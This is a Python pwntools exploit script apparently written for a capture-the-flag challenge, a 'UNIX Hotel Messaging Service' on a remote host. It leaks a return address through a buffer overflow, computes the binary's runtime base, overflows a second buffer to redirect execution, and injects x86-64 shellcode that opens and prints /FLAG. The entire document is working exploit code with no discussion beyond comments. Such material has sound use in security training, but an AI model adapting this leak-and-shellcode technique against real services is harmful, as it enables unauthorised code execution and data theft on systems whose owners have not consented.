from pwn import *
# --- Pwntools Setup ---
context.clear(arch='amd64')
# context.log_level = 'debug' # Uncomment for more detailed pwntools logging

# --- Configuration ---
HOST = "up.zoolab.org"
PORT = 12342 # As per your last log

# Offsets based on your GDB findings and our discussion
# For leaking via buf1
OFFSET_BUF1_LEAK = 56

# For calculating runtime addresses using binary base method
OFFSET_LEAKED_POINT_FROM_BASE = 0x9c99 # Offset of (return point in main) from binary base
OFFSET_MSG_FROM_BASE = 0xef220         # Offset of 'msg' buffer from binary base

# For overflowing buf3 to control RIP
PADDING_BUF3 = 0x98  # Padding before RIP overwrite in buf3 (152 bytes)

# --- Assembly Code (Shellcode to read /FLAG) ---
assembly_code = """
jmp short call_flag

do_shellcode:
    pop rdi
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 2
    syscall

    mov rdi, rax
    sub rsp, 0x40
    mov rsi, rsp
    mov rdx, 0x40
    xor rax, rax
    syscall

    mov rdx, rax
    mov rax, 1
    mov rdi, 1
    syscall

    add rsp, 0x40
    mov rax, 60
    xor rdi, rdi
    syscall

call_flag:
    call do_shellcode
    .asciz "/FLAG"
"""

try:
    shellcode = asm(assembly_code)
    # Using your padded shellcode version as it was in your script
    payload_shellcode_final = shellcode.ljust(100, b'\x90')
    log.info(f"Assembled shellcode ({len(payload_shellcode_final)} bytes): {payload_shellcode_final.hex()}")
except PwnlibException as e:
    log.failure(f"Pwntools assembly error: {e}")
    exit(1)

# --- Main Exploit Logic ---
def exploit():
    p = remote(HOST, PORT)

    # Consume initial welcome messages from task()
    p.recvuntil(b"===========================================\n")
    p.recvuntil(b"Welcome to the UNIX Hotel Messaging Service\n")
    p.recvuntil(b"===========================================\n")

    # 1. Leak Phase (overflow buf1 to leak a return address from main)
    log.info("Sending payload to buf1 to leak return address...")
    payload_buf1_leak = b'A' * OFFSET_BUF1_LEAK
    p.sendafter(b"\nWhat's your name? ", payload_buf1_leak)

    # Parse the leaked address
    p.recvuntil(b"Welcome, ")
    p.recvuntil(payload_buf1_leak) 
    leaked_address_bytes = p.recvuntil(b"\nWhat's the room number?", drop=True)
    
    if not leaked_address_bytes:
        log.failure("Failed to leak address bytes. Check offsets or server output.")
        p.close()
        return

    log.info(f"Leaked raw bytes: {leaked_address_bytes.hex()}")
    leaked_actual_ret_addr = u64(leaked_address_bytes.ljust(8, b'\x00'))
    log.success(f"Leaked runtime return address from main: {hex(leaked_actual_ret_addr)}")

    # 2. Calculate runtime addresses using DIRECT BINARY BASE method
    # leaked_actual_ret_addr is an address in main() = runtime_binary_base + OFFSET_LEAKED_POINT_FROM_BASE
    runtime_binary_base = leaked_actual_ret_addr - OFFSET_LEAKED_POINT_FROM_BASE
    log.info(f"Calculated runtime_binary_base: {hex(runtime_binary_base)}")
    
    runtime_msg_address = runtime_binary_base + OFFSET_MSG_FROM_BASE
    log.success(f"Calculated runtime msg_address (target RIP): {hex(runtime_msg_address)}")

    # 3. Send dummy input for buf2
    log.info("Sending dummy input for buf2...")
    print(p.recv(1024).decode('utf-8', errors='ignore'), end='')
    p.send(b"123") # Room number, content doesn't matter much
    print(p.recv(1024).decode('utf-8', errors='ignore'), end='')
    
    # 4. Overwrite RIP (via buf3)
    payload_buf3_overwrite = flat({
        0: b'B' * PADDING_BUF3,
        PADDING_BUF3: p64(runtime_msg_address)
    })
    # assert len(payload_buf3_overwrite) == OFFSET_BUF3_OVERFLOW

    log.info("Sending payload to buf3 to overwrite return address...")
    p.sendafter(b"\nWhat's the customer's name? ", payload_buf3_overwrite)

    # 5. Send shellcode to msg buffer
    p.recvuntil(b"\nLeave your message: ") 
    log.info(f"Sending shellcode to msg buffer...")
    p.sendline(payload_shellcode_final)

    # 6. Receive the flag
    log.success("Payloads sent. Waiting for flag...")
    try:
        flag_output = p.recvall(timeout=5.0) 
        log.info("Received from server:")
        if flag_output:
            decoded_output = flag_output.decode(errors='replace').strip()
            print(decoded_output)
            if "Thank you!" in decoded_output and len(decoded_output.replace("Thank you!", "").strip()) == 0 :
                log.warning("Only 'Thank you!' received. Shellcode might not have executed or printed the flag correctly.")
            elif not decoded_output: # Handles if only whitespace/newlines were received after strip()
                 log.warning("Empty output received for flag.")
            else:
                 log.success("Flag (or other shellcode output) hopefully received!")
        else:
            log.warning("No output received for flag (recvall returned empty).")
            
    except PwnlibException as e:
        log.failure(f"Error receiving flag: {e}")
        if hasattr(e, 'partial') and e.partial:
            log.info("Partial data received before timeout:")
            print(e.partial.decode(errors='replace'))
    finally:
        p.close()

if __name__ == "__main__":
    try:
        exploit()
    except Exception as e:
        log.critical(f"An unexpected Python error occurred: {e}")
        if 'p' in locals() and isinstance(p, process) and p.connected():
            p.interactive()
        elif 'p' in locals() and isinstance(p, remote) and p.connected():
             p.close()